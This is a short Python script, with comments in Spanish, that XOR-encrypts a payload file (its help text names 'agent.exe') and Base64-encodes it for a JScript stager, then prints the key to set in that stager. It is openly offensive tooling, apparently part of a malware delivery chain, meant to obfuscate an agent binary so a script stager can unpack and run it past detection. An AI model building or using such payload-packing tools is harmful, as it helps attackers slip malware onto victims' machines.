#!/usr/bin/env python3
"""
Cifrar payload con XOR simple (compatible con JScript antiguo)
"""

import sys
import base64
from pathlib import Path

def xor_encrypt(data, key):
    """Cifrado XOR simple pero efectivo"""
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key_bytes[i % key_len])
    
    return bytes(result)

def encrypt_file(input_path, output_path, key):
    """Cifrar archivo con XOR"""
    
    print(f"[*] Leyendo: {input_path}")
    with open(input_path, 'rb') as f:
        data = f.read()
    
    print(f"[*] Tamaño original: {len(data)} bytes")
    
    print(f"[*] Cifrando con XOR (key: {key[:16]}...)")
    encrypted = xor_encrypt(data, key)
    
    print(f"[*] Codificando en Base64...")
    b64_data = base64.b64encode(encrypted).decode('ascii')
    
    print(f"[*] Guardando en: {output_path}")
    with open(output_path, 'w') as f:
        f.write(b64_data)
    
    print(f"\n[✅] Cifrado completado")
    print(f"    Tamaño cifrado: {len(b64_data)} bytes (Base64)")
    print(f"    Clave XOR: {key}")
    print(f"\n[💡] Actualizar en el stager:")
    print(f'    var XOR_KEY = "{key}";')

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Cifrar payload con XOR para JScript')
    parser.add_argument('--input', required=True, help='Archivo a cifrar (agent.exe)')
    parser.add_argument('--output', required=True, help='Archivo de salida (.enc)')
    parser.add_argument('--key', default='MyVerySecureXORKey2025!@#', help='Clave XOR (por defecto: auto)')
    
    args = parser.parse_args()
    
    if not Path(args.input).exists():
        print(f"[❌] No se encuentra: {args.input}")
        sys.exit(1)
    
    encrypt_file(args.input, args.output, args.key)
